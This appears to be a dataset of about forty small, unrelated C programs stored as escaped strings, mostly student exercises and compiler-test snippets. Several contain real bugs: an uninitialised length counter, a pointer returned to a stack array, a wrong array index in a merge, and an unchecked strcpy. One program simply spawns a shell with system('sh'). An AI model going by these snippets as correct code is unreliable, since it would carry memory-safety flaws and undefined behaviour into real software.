    "#include <stdio.h>\n#include <string.h>\n#include <math.h>\n#include <stdlib.h>\nvoid proc(unsigned int * d, unsigned int a, unsigned int len) {\n  unsigned int start = 0;\n  unsigned int end = len - 1;\n  unsigned int middle;\n  while (end > start) {\n    middle = (start + end) / 2;\n    if (d[middle] < a) {\n      start = middle + 1;\n    }\n    else {\n      end = middle;\n    }\n  }\n  d[end] = a;\n}\nint main() {\n  unsigned int n;\n  scanf(\"%u\", &n);\n  unsigned int len = 0;\n  unsigned int * d;\n  d = malloc(sizeof(unsigned int) * n);\n  memset(d, 0, sizeof(unsigned int) * n);\n  for (int i = 0; i < n; i ++) {\n    unsigned int a;\n    scanf(\"%u\", &a);\n    if (0 == i) {\n      d[0] = a;\n      len ++;\n    }\n    else {\n      if (a < d[0]) {\n        d[0] = a;\n      }\n      else if (a > d[len - 1]) {\n        d[len] = a;\n        len ++;\n      }\n      else {\n        proc(d, a, len);\n      }\n    }\n  }\n  free(d);\n  printf(\"%u\\n\", len);\n  return 0;\n}",
    "#include <stdlib.h>\nint main(int argc, char **argv)\n{\n if (argc == 1)\n  return -1;\n else\n  return atoi(argv[1]);\n}",
    "#include <stdio.h>\n#include <math.h>\nint main (void)\n{\n float x1, x2, y1, y2, leng_x, leng_y, distance;\n printf(\"x of point A: \");\n scanf(\"%f\", &x1);\n printf(\"y of point A: \");\n scanf(\"%f\", &y1);\n printf(\"x of point B: \");\n scanf(\"%f\", &x2);\n printf(\"y of point B: \");\n scanf(\"%f\", &y2);\n leng_x = x2 - x1;\n leng_y = y2 - y1;\n float leng_x_squared = pow(leng_x, 2);\n float leng_y_squared = pow(leng_y, 2);\n distance = sqrt(leng_x_squared + leng_y_squared);\n printf (\"The distance from point A (%0.2f, %0.2f) to point B (%0.2f, %0.2f) is %0.2f \\n\", x1, y1, x2, y2, distance);\n return 0;\n}",
    "#include <stdio.h>\nint main(int args, char** argsv)\n{\n double m = 0;\n for(int x = 0; x< 4; x++)\n {\n  printf(\"Insira a nota %i: \", x+1);\n  int n = 0;\n  scanf(\"%i\", &n);\n  m+= (double) n/4;\n }\n printf(\"Sua media foi %lf\\n\", m);\n if(m >= 7)\n {\n  printf(\"Aprovado\");\n  return 0;\n }\n printf(\"Insira a nota de exame: \");\n int xn = 0;\n scanf(\"%i\", &xn);\n m = (m+xn)/2;\n printf(\"Sua nova media e: %lf\\n\", m);\n if( m >=5){\n  printf(\"Aprovado em exame\");\n  return 0;\n }\n printf(\"Reprovado!\");\n}",
    "#include<stdio.h>\n#include<ctype.h>\nint main(void)\n{\n printf(\"++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++\\n\");\n char message[80];\n int length=(int)(sizeof(message)/sizeof(message[0])),length2,i=0;\n printf(\"Enter message: \");\n while((message[i++]=getchar())!='\\n')\n  length2++;\n for(int i=0;i<length2;i++)\n  switch(message[i]=toupper(message[i]))\n  {\n   case 'A': message[i]='4';break;\n   case 'B': message[i]='8';break;\n   case 'E': message[i]='3';break;\n   case 'I': message[i]='1';break;\n   case 'O': message[i]='0';break;\n   case 'S': message[i]='5';break;\n  }\n for(int i=length2;i<(length2+10) && i<length;i++)\n  message[i]='!';\n printf(\"In BIFF-speak: \");\n for(int i=0;i<length2+10 && i<length;i++)\n  printf(\"%c\",message[i]);\n printf(\"\\n++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++\\n\");\n return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\n#include <unistd.h>\n#include <stdint.h>\n#include <sys/stat.h>\n#include <fcntl.h>\nint main()\n{\n    int fd = open(\"/proc/ibpb\", 0);\n    uint64_t t = 0;\n    while (1) {\n        int err = read(fd, &t, sizeof(t));\n        if (err != sizeof(t)) {\n            perror(\"read\");\n            exit(-1);\n        }\n        printf(\"%ld\\n\", t);\n    }\n}",
    "#include <stdlib.h>\nint bar = 0;\nvoid f (p)\n     int *p;\n{\n  int foo = 2;\n  while (foo > bar)\n    {\n      foo -= bar;\n      *p++ = foo;\n      bar = 1;\n    }\n}\nint main ()\n{\n  int tab[2];\n  tab[0] = tab[1] = 0;\n  f (tab);\n  if (tab[0] != 2 || tab[1] != 1)\n    abort ();\n  exit (0);\n}",
    "#include <stdio.h>\n#include <stdlib.h>\n#include <time.h>\nint main()\n{\n int array[] = {1,2,3,4,5};\n int arraySize = sizeof(array)/ sizeof(array[0]);\n    int item = 4;\n    int index = -1;\n    for(int i = 0; i< arraySize; i++){\n        if (array[i] == item){\n            index = i;\n            break;\n        }\n    }\n printf(\"%d\", index);\n return 0;\n}",
    "#include <stdio.h>\nint main() {\n    printf(\"Compiled with ldb toolchain.\\n\");\n}",
    "#include <stdio.h>\nint main(){\n int rows, i, j, isSymmetric;\n isSymmetric = 1;\n printf(\"Enter number of rows: \");\n scanf(\"%d\", &rows);\n printf(\"\\n\");\n int arr[rows][rows], arrTranspose[rows][rows];\n for(i=0;i<rows;i++){\n  for(j=0;j<rows;j++){\n    printf(\"Enter value of row %d and column %d: \", i+1, j+1);\n    scanf(\"%d\", &arr[i][j]);\n  }\n  printf(\"\\n\");\n }\n for(i=0;i<rows;i++){\n  for(j=0;j<rows;j++){\n   arrTranspose[j][i] = arr[i][j];\n  }\n }\n printf(\"MATRIX:\\n\\n\");\n for(i=0;i<rows;i++){\n  for(j=0;j<rows;j++){\n   printf(\"%5d\", arr[i][j]);\n  }\n  printf(\"\\n\\n\");\n }\n printf(\"TRANSPOSE OF THE MATRIX:\\n\\n\");\n for(i=0;i<rows;i++){\n  for(j=0;j<rows;j++){\n   printf(\"%5d\", arrTranspose[i][j]);\n  }\n  printf(\"\\n\\n\");\n }\n for(i=0;i<rows;i++){\n  for(j=0;j<rows;j++){\n   if(arr[i][j] != arrTranspose[i][j]){\n    isSymmetric = 0;\n    goto end;\n   }\n  }\n }\n end:\n  printf(\"\\n\");\n  if(isSymmetric == 1){\n   printf(\"Matrix is symmertric\");\n  }else{\n   printf(\"Matric is assymetric\");\n  }\n  return 0;\n}",
    "#include <stdio.h>\n#include <string.h>\n#include <stdbool.h>\n\n\n\n_Bool bfs_vis[1010];\nint t, n, m, ar[1010][1010], len[1010], left[1010], right[1010], Q[1010], dis[1010], parent[1010];\n_Bool dfs(int i){\n    int j, x;\n    for (j = 0; j < len[i]; j++){\n        x = ar[i][j];\n        if (left[x] == -1 || (parent[left[x]] == i)){\n            if (left[x] == -1 || dfs(left[x])){\n                left[x] = i;\n                right[i] = x;\n                return 1;\n            }\n        }\n    }\n    return 0;\n}\n_Bool bfs(){\n    (memset(bfs_vis, 0, sizeof(bfs_vis)));\n    int i, j, x, d, f = 0, l = 0;\n    for (i = 0; i < n; i++){\n        if (right[i] == -1){\n            Q[l++] = i;\n            dis[i] = 0;\n            bfs_vis[i] = 1;\n        }\n    }\n    while (f < l){\n        i = Q[f++];\n        for (j = 0; j < len[i]; j++){\n            x = ar[i][j];\n            d = left[x];\n            if (d == -1) return 1;\n            else if (!bfs_vis[d]){\n                Q[l++] = d;\n                parent[d] = i;\n                bfs_vis[d] = 1;\n                dis[d] = dis[i] + 1;\n            }\n        }\n    }\n    return 0;\n}\nint hopcroft_karp(){\n    int i, j, counter = 0;\n    memset(left, -1, sizeof(left));\n    memset(right, -1, sizeof(right));\n    while (bfs()){\n        for (i = 0; i < n; i++){\n            if (right[i] == -1 && dfs(i)) counter++;\n        }\n    }\n    return counter;\n}\nint main(){\n    int i, a, b;\n    while (scanf(\"%d %d\", &n, &m) != (-1)){\n        (memset(len, 0, sizeof(len)));\n        for (i = 0; i < m; i++){\n            scanf(\"%d %d\", &a, &b);\n            ar[a][len[a]++] = b;\n        }\n    }\n    return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\n\nint *foo() {\n    int i;\n    int array[5];\n    for (i=0; i<5; i++) {\n        array[i] = 42;\n    }\n    return array;\n}\nvoid bar() {\n    int i;\n    int array[5];\n    for (i=0; i<5; i++) {\n        array[i] = i;\n    }\n}\nint main()\n{\n    int i;\n    int *array = foo();\n    bar();\n    for (i=0; i<5; i++) {\n        printf(\"%d\\n\", array[i]);\n    }\n    return 0;\n}",
    "\nint fn3_i(int a1,int a2){\n  int rtn= 0;\n  int tmp = 0;\n  int i = 1;\n  while (rtn < 28 && i < 50) {\n    tmp = a1 + i;\n    rtn += a2 / tmp;\n    i++;\n  }\n  return rtn;\n}\nint main(){\n  int result_i[40];\n  int start_i = 3;\n  int tmp_i = 0;\n  int i,a1,a2;\n  for(i=0; i<40; i++){\n    if(i==0){\n      tmp_i = fn3_i(start_i,40);\n      result_i[i] = tmp_i;\n    }\n    else if(i==1){\n      a1 = result_i[0];\n      tmp_i = fn3_i(a1,a1);\n      result_i[i] = tmp_i;\n    }\n    else{\n      a1 = result_i[i-1] + 1;\n      a2 = result_i[i-2] + 2;\n      if(a1 > a2){\n        tmp_i = fn3_i(a2,a1);\n      }\n      else{\n        tmp_i = fn3_i(a1,a2);\n      }\n      result_i[i] = tmp_i;\n    }\n  }\n  return 0;\n}",
    "#include <stdio.h>\n#include <math.h>\ndouble przeciwprostokatna(double a, double b) {\n  return sqrt(a*a + b*b);\n}\nint main() {\n  double a[] = {3.0, 5.0, 1.0};\n  double b[] = {4.0, 5.0, 6.0};\n  for (int i = 0; i < 3; i++) {\n    printf(\"a = %.2f, b = %.2f, przeciwprostokatna = %.2f\\n\", a[i], b[i], przeciwprostokatna(a[i], b[i]));\n  }\n}",
    "#include <stdio.h>\nint main(){\n   int n;\n   printf(\"Enter an integer number ? : \");\n   scanf(\"%d\",&n);\n   if (n%2 == 0 && n%3 == 0)\n      printf(\"%d can be divided by both 2 and 3\\n\", n);\n   else if (n%2 == 0 || n%3 == 0)\n      printf(\"%d can be divided by 2 or 3\\n\", n);\n   else\n      printf(\"%d can not be divided by both 2 and 3\\n\", n);\n   return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\nvoid targetname(char *dest, char *src)\n{\n char *p, *p1;\n if(strlen(src) < 5 || src[0] == '\\t') return;\n for(p=src; *p && *p != ' ' && *p != '\\r'; p++);\n for(p1=p; p1 > src && *p1 != '\\\\'; p1--); p1++;\n if(p-p1 > 0) {\n  strncpy(dest, p1, p-p1);\n  dest[p-p1] = 0;\n }\n}\nint main(int argc, char *argv[])\n{\n FILE *f = 0, *fo = 0;\n unsigned char buff[512], buff2[128], outname[512];\n buff2[0] = 0;\n if(argc != 2) {\n  printf(\"usage: %s <makefile>\\n\\n\", argv[0]);\n  return 1;\n }\n f = fopen(argv[1], \"r\");\n if(!f) {\n  printf(\"%s: couldn't open %s\\n\", argv[0], argv[1]);\n  return 2;\n }\n strcpy(outname, argv[1]);\n strcat(outname, \".out\");\n fo = fopen(outname, \"w\");\n if(!fo) {\n  fclose(f);\n  printf(\"%s: couldn't open %s for writing\\n\", argv[0], outname);\n  return 3;\n }\n while(!feof(f)) {\n  fgets(buff, 512, f);\n  if(!strncmp(buff, \"\\t$(GCCUREL)\", 11) && !strchr(buff, '>')) {\n   fprintf(fo, \"\\t@echo %s: gcc\\n\\t@$(GCCUREL)\", buff2);\n   fputs(buff+11, fo);\n  } else if(!strncmp(buff, \"\\tperl -S ecopyfile.pl\", 21) && !strchr(buff, '>')) {\n   fprintf(fo, \"\\t@echo %s: perl -S ecopyfile.pl\\n\\t@perl\", buff2);\n   fputs(buff+5, fo);\n  } else if(!strncmp(buff, \"\\tperl -S epocrc.pl\", 18) && !strchr(buff, '>')) {\n   fprintf(fo, \"\\t@echo %s: perl -S epocrc.pl\\n\\t@perl\", buff2);\n   fputs(buff+5, fo);\n  } else if(!strncmp(buff, \"\\tperl -S epocaif.pl\", 19) && !strchr(buff, '>')) {\n   fprintf(fo, \"\\t@echo %s: perl -S epocaif.pl\\n\\t@perl\", buff2);\n   fputs(buff+5, fo);\n  } else if(!strncmp(buff, \"\\tperl -S emkdir.pl\", 18) && !strchr(buff, '>')) {\n   fprintf(fo, \"\\t@echo %s: perl -S emkdir.pl\\n\\t@perl\", buff2);\n   fputs(buff+5, fo);\n  } else if(!strncmp(buff, \"\\tperl -S makedef.pl\", 18) && !strchr(buff, '>')) {\n   fprintf(fo, \"\\t@echo %s: perl -S makedef.pl\\n\\t@perl\", buff2);\n   fputs(buff+5, fo);\n  } else if(!strncmp(buff, \"\\tld \", 4) && !strchr(buff, '>')) {\n   fprintf(fo, \"\\t@echo %s: ld\\n\\t@ld \", buff2);\n   fputs(buff+4, fo);\n  } else if(!strncmp(buff, \"\\tar \", 4) && !strchr(buff, '>')) {\n   fprintf(fo, \"\\t@echo %s: ar\\n\\t@ar \", buff2);\n   fputs(buff+4, fo);\n  } else if(!strncmp(buff, \"\\tif exist \", 10) && !strchr(buff, '>')) {\n   fprintf(fo, \"\\t@echo %s: if exist (del?)\\n\\t@if exist \", buff2);\n   fputs(buff+10, fo);\n  } else if(!strncmp(buff, \"\\tdlltool \", 9) && !strchr(buff, '>')) {\n   fprintf(fo, \"\\t@echo %s: dlltool\\n\\t@dlltool \", buff2);\n   fputs(buff+9, fo);\n  } else if(!strncmp(buff, \"\\tpetran \", 8) && !strchr(buff, '>')) {\n   fprintf(fo, \"\\t@echo %s: petran\\n\\t@petran \", buff2);\n   fputs(buff+8, fo);\n  } else {\n   targetname(buff2, buff);\n   fputs(buff, fo);\n  }\n }\n fclose(f);\n fclose(fo);\n remove(argv[1]);\n rename(outname, argv[1]);\n return 0;\n}",
    "#include <stdio.h>\n#include <string.h>\n#include <math.h>\n#include <stdlib.h>\nint main() {\n    char s[1000];\n    char map[10];\n    scanf(\"%s\", &s);\n    int len = strlen(s);\n    for (int i = 0; i < 10; i++) map[i] = 0;\n    for (int i = 0; i < len; i++) {\n        int x = s[i] - '0';\n        if (x >= 0 && x <= 9) map[x]++;\n    }\n    for (int i = 0; i < 10; i++) printf(\"%d \", map[i]);\n    return 0;\n}",
    "#include <stdio.h>\n#include <string.h>\n#include <math.h>\nint main()\n{\n    int n, i, j, k;\n    char a[1000], temp;\n    scanf(\" %d\", &n);\n    for(i=0; i<n; i++)\n    {\n        scanf(\" %[^\\n]s\", a);\n        for(j=0; j<strlen(a); j++)\n        {\n            if(a[j]>='a' && a[j] <='z' || a[j]>= 'A' && a[j] <= 'Z')\n            {\n                a[j] = a[j]+3;\n            }\n        }\n        for(j=0, k= strlen(a)-1; j<ceil(strlen(a)/2.00); j++, k--)\n        {\n            temp = a[j];\n            a[j]= a[k];\n            a[k] = temp;\n        }\n        for(j=trunc(strlen(a)/2); j<strlen(a); j++)\n        {\n            a[j] = a[j]-1;\n        }\n        printf(\"%s\\n\", a);\n    }\n    return 0;\n}",
    "#include<stdio.h>\nint main(int argc, char const *argv[])\n{ int i=0;\n    int a=12;\n    register int r;\n    for(;i<7;i++)\n    {\n        static int s=0;\n        printf(\"\\nauto variable value:: %d\",a);\n        printf(\"\\nregister variable value:: %d \",r);\n        printf(\"\\nstatic variable value:: %d\",s);\n        s++;\n        a++;\n        r++;\n    }\n    return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\nint main()\n{\n    int status = system(\"sh\");\n    if (status == -1)\n        printf(\"Failed\\n\");\n    return status;\n}",
    "#include<stdio.h>\n#include<stdlib.h>\n\n\nint main()\n{\n  int array[3][4] = {{1,2,3,4},{5,6,7,8},{9,10,11,12}};\n  int *p;\n  for(p=array[0];p<array[0]+3*4;p++)\n  {\n    if((p-array[0])%4==0)\n    {\n      printf(\"\\n\");\n    }\n    printf(\"%d \",*p);\n  }\n  return 0;\n}",
    "#include <stdio.h>\n\n\n\nint connected(int [][4], int, int, int, int, int);\nint print_matrix(int [][4], int, int);\nint main(int argc, char * argv[]) {\n    int matrix[3][4] = {\n        {0,0,1,0},\n        {1,0,1,0},\n        {0,0,0,2},\n    };\n    int init_r = 0;\n    int init_c = 0;\n    int result;\n    int ref_val = matrix[init_r][init_c];\n    result = connected(matrix, 3, 4, init_r, init_c, 1);\n    printf(\"Connected columns (reference value is %d): %d\\n\", ref_val, result);\n    return 0;\n}\nint print_matrix(int m[][4], int r, int c) {\n    int i,j;\n    for(i=0; i<r; i++) {\n        for(j=0; j<c; j++) {\n            printf(\"%2d\", m[i][j]);\n        }\n        printf(\"\\n\");\n    }\n    printf(\"\\n\");\n}\nint connected(int m[][4], int R, int C, int c_r, int c_c, int debug) {\n    int value = m[c_r][c_c];\n    int reachable = 1;\n    if(debug)\n        print_matrix(m, R, C);\n    m[c_r][c_c] = value + 9;\n    if(c_c>0){\n        if(m[c_r][c_c-1] == value) {\n            reachable += connected(m, R, C, c_r, c_c-1, debug);\n        }\n    }\n    if((c_c+1)<C){\n        if(m[c_r][c_c+1] == value) {\n            reachable += connected(m, R, C, c_r, c_c+1, debug);\n        }\n    }\n    if((c_r+1)<R){\n        if(m[c_r+1][c_c] == value) {\n            reachable += connected(m, R, C, c_r+1, c_c, debug);\n        }\n    }\n    if(c_r>0){\n        if(m[c_r-1][c_c] == value) {\n            reachable += connected(m, R, C, c_r-1, c_c, debug);\n        }\n    }\n    return reachable;\n}",
    "#include<stdio.h>\nint main(){\n    float valorReal, dolar, euro;\n    printf(\"Digite o valor para ser convertido (R$):  \");\n    scanf(\"%f\", &valorReal);\n    dolar = valorReal / 1.9;\n    euro = valorReal / 3.1;\n    printf(\"\\n %.2f reais compra %.2f dolares!\", valorReal, dolar);\n    printf(\"\\n %.2f reais compra %.2f euros!\", valorReal, euro);\n}",
    "#include <stdio.h>\n\n\nconst int denomArr[11] = {10000, 5000, 2000, 1000, 500, 200, 100, 50, 20, 10, 5};\nunsigned long long int memoTable[6001][11];\nunsigned long long int countNumChange(int amount, int maxDenomInd)\n{\n    if(amount == 0 || maxDenomInd == 11 - 1)\n        return 1;\n    if(maxDenomInd >= 11)\n        return 0;\n    if(memoTable[amount / 5][maxDenomInd] != (unsigned long long int) (-1))\n        return memoTable[amount / 5][maxDenomInd];\n    unsigned long long int numWay = 0;\n    int amountLeft = amount;\n    while(amountLeft >= 0)\n    {\n        numWay += countNumChange(amountLeft, maxDenomInd + 1);\n        amountLeft -= denomArr[maxDenomInd];\n    }\n    memoTable[amount / 5][maxDenomInd] = numWay;\n    return numWay;\n}\nint main(void)\n{\n    int dollarPart, centPart, amount, i, j;\n    unsigned long long int numWay;\n    for(i = 0; i < 6001; i++)\n            for(j = 0; j < 11; j++)\n                memoTable[i][j] = (unsigned long long int) -1;\n    while(1)\n    {\n        scanf(\"%d.%d\", &dollarPart, &centPart);\n        if(dollarPart == 0 && centPart == 0)\n            break;\n        amount = dollarPart * 100 + centPart;\n        if(centPart % 5)\n            numWay = 0;\n        else\n            numWay = countNumChange(amount, 0);\n        printf(\"%3d.%02d%17llu\\n\", dollarPart, centPart, numWay);\n    }\n    return 0;\n}",
    "#include <stdio.h>\nint main() {\nint ddd;\nscanf(\"%i\",&ddd);\nswitch(ddd){\ncase 61:\nprintf(\"Brasilia\\n\");\nbreak;\ncase 71:\nprintf(\"Salvador\\n\");\nbreak;\ncase 11:\nprintf(\"Sao Paulo\\n\");\nbreak;\ncase 21:\nprintf(\"Rio de Janeiro\\n\");\nbreak;\ncase 32:\nprintf(\"Juiz de Fora\\n\");\nbreak;\ncase 19:\nprintf(\"Campinas\\n\");\nbreak;\ncase 27:\nprintf(\"Vitoria\\n\");\nbreak;\ncase 31:\nprintf(\"Belo Horizonte\\n\");\nbreak;\ndefault:\nprintf(\"DDD nao cadastrado\\n\");\n}\n    return 0;\n}",
    "#include <stdio.h>\n\n\nint main(int argc, char * argv[]) {\n    int arr1[5];\n    int arr2[5];\n    int ord[(5*2)];\n    int i;\n    int x1, x2;\n    printf(\"Insert values of list 1: \\n\");\n    for(i=0; i<5; i++) {\n        scanf(\"%d\", &arr1[i]);\n    }\n    printf(\"Insert values of list 2: \\n\");\n    for(i=0; i<5; i++) {\n        scanf(\"%d\", &arr2[i]);\n    }\n    x1 = 0;\n    x2 = 0;\n    i = 0;\n    while(x1 < 5 || x2 < 5) {\n        if(x1 >= 5) {\n            ord[i] = arr2[x2];\n            x2++;\n        } else if (x2 >= 5) {\n            ord[i] = arr2[x1];\n            x1++;\n        } else {\n            if(arr1[x1] <= arr2[x2]){\n                ord[i] = arr1[x1];\n                x1++;\n            } else {\n                ord[i] = arr2[x2];\n                x2++;\n            }\n        }\n        i++;\n    }\n    for(i=0; i<(5*2); i++) {\n        printf(\"%d \", ord[i]);\n    }\n    printf(\"\\n\");\n    return 0;\n}",
    "#include<stdio.h>\n#include<unistd.h>\n#include<stdlib.h>\n\n\nint main(int argc, char const *argv[])\n{\n int pipefd1[2],pipefd2[2];\n int status1, status2;\n char str1[10]=\"SujoyDatta\";\n char str2[10];\n char str3[10];\n status1= pipe(pipefd1);\n if(status1==-1)\n {\n  printf(\"Pipe Failed\\n\");\n  return 0;\n }\n status2= pipe(pipefd2);\n if(status2==-1)\n {\n  printf(\"Pipe Failed\\n\");\n  return 0;\n }\n pid_t pid= fork();\n if(pid>0)\n {\n  close(pipefd1[0]);\n  close(pipefd2[1]);\n  printf(\"The original string by the parent is %s\\n\",str1);\n  write(pipefd1[1],str1,sizeof(str1)+1);\n  read(pipefd2[0],str2,sizeof(str2));\n  printf(\"The reversed string by the child is %s\\n\",str2);\n }\n else\n {\n  close(pipefd1[1]);\n  close(pipefd2[0]);\n  read(pipefd1[0],str2,sizeof(str2));\n  int j=0;\n  int i=sizeof(str2)/sizeof(str2[0]) -1;\n  for(;i>=0;i--)\n  {\n   str3[j]=str2[i];\n   j++;\n  }\n  write(pipefd2[1],str3,sizeof(str3)+1);\n }\n return 0;\n}",
    "#include <stdio.h>\nint main(void) {\n    int dinheiro;\n    printf(\"Digite quanto voce tem: \");\n    scanf(\"%i\", &dinheiro);\n    if (dinheiro < 300) {\n        printf(\"Voce nao pode comprar nenhum tenis! :(\");\n    } else {\n        if (dinheiro >= 600) {\n            printf(\"Voce pode comprar o tenis de competicao!\");\n        } else {\n            printf(\"Voce pode comprar o tenis comum!\");\n        }\n    }\n    return 0;\n}",
    "#include <stdio.h>\nint main(){\n    int row1, col1, row2, col2, i, j, k, answer;\n    int mat1[5][5], mat2[5][5];\n    printf(\"Enter the size of matrix (max 5X5):\\n\");\n    printf(\"For matrix one\\n\");\n    printf(\"Enter rows: \");\n    scanf(\"%d\", &row1);\n    printf(\"Enter columns: \");\n    scanf(\"%d\", &col1);\n    printf(\"\\nFor matrix two\\n\");\n    printf(\"Enter rows: \");\n    scanf(\"%d\", &row2);\n    printf(\"Enter columns: \");\n    scanf(\"%d\", &col2);\n    if(row1 <= 5 && col1 <= 5 && row2 <= 5 && col2 <= 5){\n        if(col1 == row2){\n            printf(\"Enter matrix one: \\n\");\n            for(i = 0; i < row1; i++){\n                for(j = 0; j < col1; j++){\n                    scanf(\"%d\", &mat1[i][j]);\n                }\n            }\n            printf(\"Enter matrix two: \\n\");\n            for(i = 0; i < row2; i++){\n                for(j = 0; j < col2; j++){\n                    scanf(\"%d\", &mat2[i][j]);\n                }\n            }\n            for(i = 0; i < row1; i++){\n                for(j = 0; j < col2; j++){\n                    answer = 0;\n                    for(k = 0; k < col1; k++){\n                        answer += mat1[i][k] * mat2[k][j];\n                    }\n                    printf(\"%d\\t\", answer);\n                }\n                printf(\"\\n\");\n            }\n        }else{\n            printf(\"For matrix multiplication columns of first matrix must be equal to the rows of second matrix.\\n\");\n        }\n    }else{\n        printf(\"Sorry we can have matrix of mas 5X5 :(\\n Please try again\");\n    }\n    return 0;\n}",
    "#include <stdio.h>\n#include <errno.h>\n#include <string.h>\n#include <stdlib.h>\n#include <limits.h>\nvoid usage(char *prgm_name)\n{\n    printf(\"%s [errno]\\n\", prgm_name);\n    printf(\"  Translates a given errno into a system error string\\n\");\n    printf(\"  using the library call strerror().\\n\");\n}\nint main (int argc, char *argv[])\n{\n    int error;\n    char *end_ptr;\n    if (argc < 2) {\n        usage(argv[0]);\n        return -1;\n    }\n    error = strtol(argv[1], &end_ptr, 0);\n    if (end_ptr == argv[1]){\n        printf(\"Invalid input string - %s\\n\", argv[1]);\n    }\n    else if (error == (-2147483647L -1L)) {\n        printf(\"Underflow on - %s\\n\", argv[1]);\n    }\n    else if (error == 2147483647L) {\n        printf(\"Overflow on - %s\\n\", argv[1]);\n    }\n    else {\n        printf(\"errno: %d - %s\\n\", error, strerror(error));\n    }\n    return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\nint main () {\n    FILE *stream = fopen(\"inputs/input17\", \"r\");\n    int _x1, _x2, y1, y2;\n    fscanf(stream, \"target area: x=%d..%d, y=%d..%d\", &_x1, &_x2, &y1, &y2);\n    printf(\"%d\\n\", (abs(y1) * (abs(y1) - 1)) / 2);\n    return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\nint main(int argc, char **argv)\n{\n  printf(\"Digite um texto qualquer e pressione Enter ao final:\\n\");\n  char *buf;\n  buf = malloc(1024);\n  fgets(buf, 1024, (stdin));\n  printf(\"Texto digitado foi:\\n\");\n  printf(\"%s\\n\", buf);\n  return 1;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\nint fib(int n)\n{\n    int result = 1, prev = 0;\n    while (n > 0)\n    {\n        int current = result;\n        result += prev;\n        prev = current;\n        n -= 1;\n    }\n    return result;\n}\nint main(int argc, char *argv[])\n{\n    int n = 0, val = 0;\n    if (argc < 2)\n    {\n        return -1;\n    }\n    n = atoi(argv[1]);\n    val = fib(n);\n    printf(\"%d number in Fibonacci sequence is %d\\n\", n, val);\n    return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\n#include <unistd.h>\n#include <sys/types.h>\nint main (int argc, char* argv[])\n{\n if (argc != 2)\n  {\n    fprintf ((stderr), \"Syntaxe : %s duree-du-sleep\\n\", argv[0]);\n    exit (1);\n  }\n printf(\"\\n%s (Pid = %d): Regardez-moi avec ps ... Je m'endors %s secondes.\\n\",\n       argv[0], getpid(),argv[1]);\n sleep (atoi(argv[1]));\n printf(\"%s (Pid = %d): Je me reveille apr\u00e8s %s secondes.\\n\\n\",\n        argv[0], getpid(), argv[1]);\n}",
    "#include <stdio.h>\nint main()\n{\n int n=0,a=0,raz=0,i=1;\n scanf (\"%d\",&n);\n for( i=1;i<=n; i++)\n {\n  scanf (\"%d\", &a);\n  a=a*(-1);\n  raz=raz+a;\n }\n printf (\"%d\\n\", raz);\n return 0;\n}",
    "#include <stdio.h>\nint main()\n{\n float x=3.0,y=12.5,z=523.3,A=300.0,B=1200.5,C=5300.3;\n printf(\"X\\ty\\tz=%12.1f|%11.1f|\\t%10.1f|\\n\",x,y,z);\n printf(\"A\\tB\\tC=%12.1f|%11.1f|\\t%10.1f|\\n\",A,B,C);\n printf(\"--------------------------------------------------------------------\\n\");\n printf(\"X\\ty\\tz=\\t|%-15.2f|%-15.2f|%-10.2f\\n\",x,y,z);\n printf(\"A\\tB\\tC=\\t|%-15.2f|%-15.2f|%-10.2f\\n\",A,B,C);\n return 0;\n}",
    "#include <stdio.h>\n\n\nvoid get_purchase_information(float *, float *, float *,\n float *);\nvoid print_receipt(float, float, float, float, float, float,\n float, float, float);\nint main(void)\n{\n float house_width, house_length;\n float discount;\n float price_squared_meter;\n float tax_house, tax_interior;\n float price_house, price_interior = 15000000.0;\n float price_house_total, price_interior_total;\n float subtotal, total;\n get_purchase_information(&house_width, &house_length,\n  &price_squared_meter, &discount);\n tax_interior = price_interior * (10 / 100.0);\n price_interior_total = price_interior + tax_interior;\n price_house = (house_width * house_length) *\n  price_squared_meter;\n tax_house = price_house * (1 / 100.0);\n price_house_total = price_house + tax_house;\n subtotal = price_interior_total + price_house_total;\n if (discount != 0) {\n  total = subtotal - (subtotal * (discount / 100.0));\n } else {\n  total = subtotal;\n }\n print_receipt(house_width, house_length, price_interior,\n  price_house, tax_interior, tax_house, subtotal,\n  discount, total);\n return 0;\n}\nvoid get_purchase_information(float *house_width,\n float *house_length, float *price_squared_meter,\n float *discount)\n{\n printf(\"Width of house (meter) : \");\n scanf(\"%f\", house_width);\n printf(\"Length of house (meter): \");\n scanf(\"%f\", house_length);\n printf(\"Price per squared meter: \");\n scanf(\"%f\", price_squared_meter);\n printf(\"Dealer discount (%%)    : \");\n scanf(\"%f\", discount);\n return;\n}\nvoid print_receipt(float house_width, float house_length,\n float price_interior, float price_house, float tax_interior,\n float tax_house, float subtotal, float discount, float total)\n{\n printf(\"\\n\\n-- HOUSE INFORMATION --\\n\");\n printf(\"Width : %.2f\\n\", house_width);\n printf(\"Length: %.2f\", house_length);\n printf(\"\\n\\n---------------- RECEIPT ----------------\\n\");\n printf(\"Interior:        %20.0f won\\n\", price_interior);\n printf(\"House:           %20.0f won\\n\", price_house);\n printf(\"Tax of interior: %20.0f won\\n\", tax_interior);\n printf(\"Tax of house:    %20.0f won\\n\", tax_house);\n printf(\"-----------------------------------------\\n\");\n printf(\"Subtotal:        %20.0f won\\n\", subtotal);\n printf(\"Discount:        %20.0f %%\\n\", discount);\n printf(\"-----------------------------------------\\n\");\n printf(\"TOTAL:           %20.0f won\\n\", total);\n return;\n}",
